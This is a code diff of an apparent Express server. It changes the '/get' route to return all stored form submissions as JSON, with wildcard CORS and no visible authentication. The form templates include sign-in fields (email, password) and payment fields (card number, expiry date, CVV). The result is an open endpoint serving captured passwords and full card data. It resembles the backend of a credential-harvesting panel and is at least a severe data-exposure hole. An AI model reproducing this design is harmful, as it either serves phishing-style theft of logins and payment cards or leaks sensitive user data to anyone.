@@ -503,13 +503,28 @@ function sanitizeForJs(str) {
     .replace(/&/g, '&amp;');
 }
 
-// Route to serve the submissions.html page
-app.get('/get', (req, res) => {
+// Route to return submissions as JSON
+app.get('/get', async (req, res) => {
   try {
-    res.sendFile(path.join(__dirname, 'public', 'submissions.html'));
+    // Add explicit CORS headers
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
+    
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    const templates = {
+      'sign-in': { name: 'Sign In Form', fields: [{ id: 'email' }, { id: 'password' }] },
+      'contact': { name: 'Contact Form', fields: [{ id: 'phone' }, { id: 'email' }] },
+      'payment-checkout': { name: 'Payment Checkout Form', fields: [{ id: 'card-number' }, { id: 'exp-date' }, { id: 'cvv' }] }
+    };
+    console.log(`Retrieved ${submissions.length} submissions for /get`);
+    res.json({
+      submissions: submissions.reverse(),
+      templates
+    });
   } catch (error) {
-    console.error('Error serving submissions.html:', error.message, error.stack);
-    res.status(500).send('Error loading submissions page');
+    console.error('Error fetching submissions for /get:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to fetch submissions', details: error.message });
   }
 });
 
@@ -595,7 +610,7 @@ app.post('/form/:id/submit', async (req, res) => {
   }
 });
 
-// Route to serve JSON for submissions (for submissions.html) - WITH CORS HEADERS
+// Route to serve JSON for submissions (for backwards compatibility)
 app.get('/submissions', async (req, res) => {
   try {
     // Add explicit CORS headers
